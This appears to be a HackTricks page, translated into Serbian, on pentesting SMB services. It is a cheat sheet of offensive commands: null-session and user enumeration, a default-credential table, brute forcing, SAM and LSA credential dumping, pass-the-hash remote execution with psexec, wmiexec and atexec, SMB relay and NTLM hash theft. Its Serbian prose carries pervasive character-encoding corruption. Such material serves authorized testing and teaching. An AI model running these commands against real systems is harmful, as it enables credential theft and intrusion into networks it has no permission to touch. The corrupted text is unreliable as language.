# 139,445 - Pentesting SMB

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Port 139**

_**Network Basic Input Output System (NetBIOS)**_ je softverski protokol dizajniran da omoguƒái aplikacijama, raƒçunarima i desktop raƒçunarima unutar lokalne mre≈æe (LAN) da interaguju sa mre≈ænom opremom i **olak≈°aju prenos podataka preko mre≈æe**. Identifikacija i lokacija softverskih aplikacija koje rade na NetBIOS mre≈æi posti≈æe se putem njihovih NetBIOS imena, koja mogu biti do 16 karaktera i ƒçesto su razliƒçita od imena raƒçunara. NetBIOS sesija izmeƒëu dve aplikacije se inicira kada jedna aplikacija (kao klijent) izda komandu da "pozove" drugu aplikaciju (kao server) koristeƒái **TCP Port 139**.

```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```

## Port 445

Tehniƒçki, Port 139 se naziva 'NBT preko IP-a', dok se Port 445 identifikuje kao 'SMB preko IP-a'. Akronim **SMB** oznaƒçava '**Server Message Blocks**', koji je takoƒëe poznat kao **Common Internet File System (CIFS)**. Kao protokol mre≈ænog sloja aplikacije, SMB/CIFS se uglavnom koristi za omoguƒáavanje deljenog pristupa datotekama, ≈°tampaƒçima, serijskim portovima, i olak≈°avanje razliƒçitih oblika komunikacije izmeƒëu ƒçvorova na mre≈æi.

Na primer, u kontekstu Windows-a, istiƒçe se da SMB mo≈æe direktno raditi preko TCP/IP-a, elimini≈°uƒái potrebu za NetBIOS-om preko TCP/IP-a, kroz kori≈°ƒáenje porta 445. Nasuprot tome, na razliƒçitim sistemima, primeƒáuje se kori≈°ƒáenje porta 139, ≈°to ukazuje da se SMB izvr≈°ava u saradnji sa NetBIOS-om preko TCP/IP-a.

```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

### SMB

**Server Message Block (SMB)** protokol, koji radi u **klijent-server** modelu, namenjen je za regulisanje **pristupa fajlovima**, direktorijumima i drugim mre≈ænim resursima poput ≈°tampaƒça i rutera. Prvenstveno se koristi u seriji operativnih sistema **Windows**, SMB osigurava kompatibilnost unazad, omoguƒáavajuƒái ureƒëajima sa novijim verzijama Microsoft-ovog operativnog sistema da se bez problema pove≈æu sa onima koji koriste starije verzije. Dodatno, projekat **Samba** nudi besplatno softversko re≈°enje, omoguƒáavajuƒái implementaciju SMB-a na **Linux** i Unix sistemima, olak≈°avajuƒái komunikaciju izmeƒëu platformi putem SMB-a.

Deljenja, koja predstavljaju **proizvoljne delove lokalnog fajl sistema**, mogu biti obezbeƒëena od strane SMB servera, ƒçineƒái hijerarhiju vidljivom klijentu delimiƒçno **nezavisnom** od stvarne strukture servera. **Access Control Lists (ACLs)**, koje defini≈°u **prava pristupa**, omoguƒáavaju **detaljnu kontrolu** nad korisniƒçkim dozvolama, ukljuƒçujuƒái atribute poput **`izvr≈°i`**, **`ƒçitaj`** i **`puna pristupa`**. Ova prava mogu biti dodeljena pojedinaƒçnim korisnicima ili grupama, zasnovanim na deljenjima, i razlikuju se od lokalnih dozvola postavljenih na serveru.

### IPC$ Deljenje

Pristup deljenju IPC$ mo≈æe se dobiti putem anonimne nule sesije, omoguƒáavajuƒái interakciju sa uslugama izlo≈æenim putem imenovanih cevi. Alat `enum4linux` je koristan u tu svrhu. Pravilno kori≈°ƒáen, omoguƒáava dobijanje:

* Informacija o operativnom sistemu
* Detalja o nadreƒëenom domenu
* Kompilaciju lokalnih korisnika i grupa
* Informacija o dostupnim SMB deljenjima
* Efikasnu politiku sistema bezbednosti

Ova funkcionalnost je kljuƒçna za mre≈æne administratore i bezbednosne struƒçnjake kako bi procenili bezbednosni polo≈æaj SMB (Server Message Block) usluga na mre≈æi. `enum4linux` pru≈æa sveobuhvatan pregled SMB okru≈æenja ciljnog sistema, ≈°to je kljuƒçno za identifikaciju potencijalnih ranjivosti i osiguravanje da su SMB usluge pravilno za≈°tiƒáene.

```bash
enum4linux -a target_ip
```

Gornja komanda je primer kako se `enum4linux` mo≈æe koristiti za izvoƒëenje potpune enumeracije protiv cilja navedenog u `target_ip`.

## ≈†ta je NTLM

Ako ne znate ≈°ta je NTLM ili ≈æelite da saznate kako funkcioni≈°e i kako se mo≈æe zloupotrebiti, naƒái ƒáete veoma interesantnu ovu stranicu o **NTLM** gde je obja≈°njeno **kako ovaj protokol funkcioni≈°e i kako mo≈æete iskoristiti to:**

{% content-ref url="../../windows-hardening/ntlm/" %}
[ntlm](../../windows-hardening/ntlm/)
{% endcontent-ref %}

## **Enumeracija servera**

### **Skeniranje** mre≈æe u potrazi za hostovima:

```bash
nbtscan -r 192.168.0.1/24
```

### Verzija SMB servera

Da biste prona≈°li moguƒáe eksploate za SMB verziju, va≈æno je znati koja verzija se koristi. Ako ove informacije ne postoje u drugim kori≈°ƒáenim alatima, mo≈æete:

* Koristiti **MSF** pomoƒáni modul \_**auxiliary/scanner/smb/smb\_version**
* Ili ovaj skript:

```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```

### **Pretraga eksploatacije**

```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```

### **Moguƒái** Kredencijali

| **Korisniƒçko ime(i)** | **ƒåesta lozinke**                          |
| --------------------- | ------------------------------------------ |
| _(prazno)_            | _(prazno)_                                 |
| gost                  | _(prazno)_                                 |
| Administrator, admin  | _(prazno)_, password, administrator, admin |
| arcserve              | arcserve, backup                           |
| tivoli, tmersrvd      | tivoli, tmersrvd, admin                    |
| backupexec, backup    | backupexec, backup, arcada                 |
| test, lab, demo       | password, test, lab, demo                  |

### Napad Brutom Forcom

* [**SMB Napad Brutom Forcom**](../../generic-methodologies-and-resources/brute-force.md#smb)

### Informacije o SMB Okru≈æenju

### Dobijanje Informacija

```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```

### Nabrojavanje Korisnika, Grupa i Prijavljenih Korisnika

Ove informacije veƒá bi trebalo da budu prikupljene pomoƒáu enum4linux i enum4linux-ng

```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```

### Nabrojavanje lokalnih korisnika

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)

```bash
lookupsid.py -no-pass hostname.local
```

Jednolinijski

```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

### Metasploit - Nabrojavanje lokalnih korisnika

```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```

### **Enumerisanje LSARPC i SAMR rpcclient**

{% content-ref url="rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](rpcclient-enumeration.md)
{% endcontent-ref %}

### GUI konekcija sa linuxa

#### U terminalu:

`xdg-open smb://cascade.htb/`

#### U prozoru pregledaƒça fajlova (nautilus, thunar, itd)

`smb://friendzone.htb/general/`

## Enumeracija deljenih foldera

### Lista deljenih foldera

Uvek je preporuƒçljivo proveriti da li mo≈æete pristupiti bilo ƒçemu, ako nemate pristupne podatke, poku≈°ajte koristiti **null** **pristupne podatke/gost korisnika**.

```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```

### **Pove≈æi/Listaj deljeni folder**

```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```

### **Ruƒçno nabrajanje Windows deljenih resursa i povezivanje sa njima**

Moguƒáe je da ste ograniƒçeni da prika≈æete bilo koje deljene resurse na host ma≈°ini i kada poku≈°ate da ih nabrojite, mo≈æe se ƒçiniti da ne postoji nijedan deo na koji mo≈æete da se pove≈æete. Stoga bi bilo vredno poku≈°ati ruƒçno se povezati sa deljenim resursom. Da biste ruƒçno nabrojali deljene resurse, mo≈æda ƒáete ≈æeleti da tra≈æite odgovore poput NT\_STATUS\_ACCESS\_DENIED i NT\_STATUS\_BAD\_NETWORK\_NAME, kada koristite validnu sesiju (npr. null sesiju ili validne akreditive). Ovi odgovori mogu ukazivati da li deo postoji i da nemate pristup njemu ili deo uop≈°te ne postoji.

Uobiƒçajena imena deljenih resursa za Windows ciljeve su

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(Uobiƒçajena imena deljenih resursa iz _**Network Security Assessment 3rd edition**_)

Mo≈æete poku≈°ati da se pove≈æete sa njima koristeƒái sledeƒáu komandu

```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```

ili ovaj skript (koristeƒái null sesiju)

```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```

primeri

```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```

### **Nabrajanje deljenih resursa sa Windows / bez alata treƒáe strane**

PowerShell

```powershell
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```

CMD konzola

```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```

MMC Snap-in (graficki)

```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```

explorer.exe (graficki), unesite `\\<ip>\` da biste videli dostupne ne-sakrivene deljene resurse.

### Montirajte deljeni folder

```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```

### **Preuzimanje fajlova**

Proƒçitajte prethodne sekcije kako biste nauƒçili kako da se pove≈æete sa akreditivima/Pass-the-Hash.

```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```

### Pretraga zajedniƒçkih fascikli domena

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)\*\*\*\*

```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```

* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) pauk.
* `-M pauk_plus [--share <ime_deljenja>]`
* `--obrazac txt`

```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```

Posebno interesantni sa deljenja su fajlovi nazvani **`Registry.xml`** jer **mogu sadr≈æati lozinke** za korisnike konfigurisane sa **autologon** putem Grupe politika. Ili **`web.config`** fajlovi jer sadr≈æe akreditive.

{% hint style="info" %}
**SYSVOL deljenje** je **ƒçitljivo** za sve autentifikovane korisnike u domenu. Tamo mo≈æete **pronaƒái** mnoge razliƒçite batch, VBScript i PowerShell **skripte**.\
Trebalo bi da **proverite** **skripte** unutar njega jer biste mogli **pronaƒái** osetljive informacije poput **lozinki**.
{% endhint %}

## ƒåitanje Registra

Mo≈æda ƒáete moƒái da **proƒçitate registar** koristeƒái neke otkrivene akreditive. Impacket **`reg.py`** vam omoguƒáava da poku≈°ate:

```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```

## Post Eksploatacija

Podrazumevana konfiguracija **Samba** servera obiƒçno se nalazi u `/etc/samba/smb.conf` i mo≈æe imati neke **opasne konfiguracije**:

| **Pode≈°avanje**             | **Opis**                                                             |
| --------------------------- | -------------------------------------------------------------------- |
| `browseable = yes`          | Dozvoljava li prikazivanje dostupnih deljenja u trenutnom deljenju?  |
| `read only = no`            | Zabranjuje li kreiranje i modifikaciju fajlova?                      |
| `writable = yes`            | Dozvoljava li korisnicima kreiranje i modifikaciju fajlova?          |
| `guest ok = yes`            | Dozvoljava li povezivanje na servis bez kori≈°ƒáenja lozinke?          |
| `enable privileges = yes`   | Po≈°tuje li privilegije dodeljene odreƒëenom SID-u?                    |
| `create mask = 0777`        | Koje dozvole treba dodeliti novokreiranim fajlovima?                 |
| `directory mask = 0777`     | Koje dozvole treba dodeliti novokreiranim direktorijumima?           |
| `logon script = script.sh`  | Koji skript treba da se izvr≈°i prilikom korisnikovog prijavljivanja? |
| `magic script = script.sh`  | Koja skripta treba da se izvr≈°i kada se skripta zatvori?             |
| `magic output = script.out` | Gde treba da se ƒçuva izlaz magiƒçne skripte?                          |

Komanda `smbstatus` pru≈æa informacije o **serveru** i o **kome je povezan**.

## Autentifikacija kori≈°ƒáenjem Kerberosa

Mo≈æete se **autentifikovati** na **kerberos** kori≈°ƒáenjem alata **smbclient** i **rpcclient**:

```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```

## **Izvr≈°avanje komandi**

### **crackmapexec**

crackmapexec mo≈æe izvr≈°iti komande **zloupotrebom** bilo kog od **mmcexec, smbexec, atexec, wmiexec** pri ƒçemu je **wmiexec** metoda **podrazumevana**. Mo≈æete naznaƒçiti koju opciju ≈æelite da koristite pomoƒáu parametra `--exec-method`:

```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```

### [**psexec**](../../windows-hardening/lateral-movement/psexec-and-winexec.md)**/**[**smbexec**](../../windows-hardening/lateral-movement/smbexec.md)

Oba opcije ƒáe **kreirati novu uslugu** (koristeƒái _\pipe\svcctl_ putem SMB-a) na ciljnom raƒçunaru i koristiti je za **izvr≈°avanje neƒçega** (**psexec** ƒáe **prebaciti** izvr≈°nu datoteku na ADMIN$ deljenje, a **smbexec** ƒáe pokazati na **cmd.exe/powershell.exe** i staviti u argumente payload --**tehnika bez datoteke-**-).\
**Vi≈°e informacija** o [**psexec**](../../windows-hardening/lateral-movement/psexec-and-winexec.md) i [**smbexec**](../../windows-hardening/lateral-movement/smbexec.md).\
Na **kali** se nalazi u /usr/share/doc/python3-impacket/examples/

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```

Kori≈°ƒáenjem **parametra** `-k` mo≈æete autentifikovati prema **kerberosu** umesto **NTLM-a**

### [wmiexec](../../windows-hardening/lateral-movement/wmicexec.md)/dcomexec

Tajno izvr≈°ite komandnu liniju bez dodira sa diskom ili pokretanja novog servisa kori≈°ƒáenjem DCOM-a preko **porta 135.**\
Na **kali** se nalazi na /usr/share/doc/python3-impacket/examples/

```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```

Kori≈°ƒáenjem **parametra** `-k` mo≈æete se autentifikovati preko **kerberosa** umesto **NTLM**.

```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```

### [AtExec](../../windows-hardening/lateral-movement/atexec.md)

Izvr≈°ite komande putem Planera zadataka (koristeƒái _\pipe\atsvc_ putem SMB-a).\
U **kali** se nalazi na /usr/share/doc/python3-impacket/examples/

```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```

## Impacket referenca

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **Bruteforce korisniƒçke akreditive**

**Ovo se ne preporuƒçuje, mo≈æete blokirati nalog ako prema≈°ite maksimalan dozvoljeni broj poku≈°aja**

```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```

## Napad preusmeravanja SMB-a

Ovaj napad koristi Responder alat za **hvatanje SMB autentifikacionih sesija** na internoj mre≈æi, i **preusmerava** ih ka **ciljnom raƒçunaru**. Ako autentifikaciona **sesija uspe**, automatski ƒáe vas prebaciti u **sistemski** **shell**.\
[**Vi≈°e informacija o ovom napadu ovde.**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Windows biblioteka URLMon.dll automatski poku≈°ava autentifikaciju na hostu kada stranica poku≈°a da pristupi nekom sadr≈æaju putem SMB-a, na primer: `img src="\\10.10.10.10\path\image.jpg"`

Ovo se de≈°ava sa funkcijama:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

Koje koriste neki pretra≈æivaƒçi i alati (kao ≈°to je Skype)

![Izvor: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../.gitbook/assets/image (93).png>)

### SMBTrap kori≈°ƒáenjem MitMf

![Izvor: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../.gitbook/assets/image (94).png>)

## NTLM Kraƒëa

Sliƒçno kao kod SMB zamke, postavljanje zlonamernih fajlova na ciljni sistem (putem SMB-a, na primer) mo≈æe izazvati poku≈°aj SMB autentifikacije, omoguƒáavajuƒái da se NetNTLMv2 he≈° presretne alatom poput Responder-a. He≈° zatim mo≈æe biti de≈°ifrovan offline ili kori≈°ƒáen u [napadu preusmeravanja SMB-a](./#smb-relay-attack).

[Pogledajte: ntlm\_theft](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## HackTricks Automatske Komande

```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as ‚ÄòNBT over IP‚Äô, Port 445 is ‚ÄòSMB over IP‚Äô. SMB stands for ‚ÄòServer Message Blocks‚Äô. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini da podr≈æite HackTricks:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
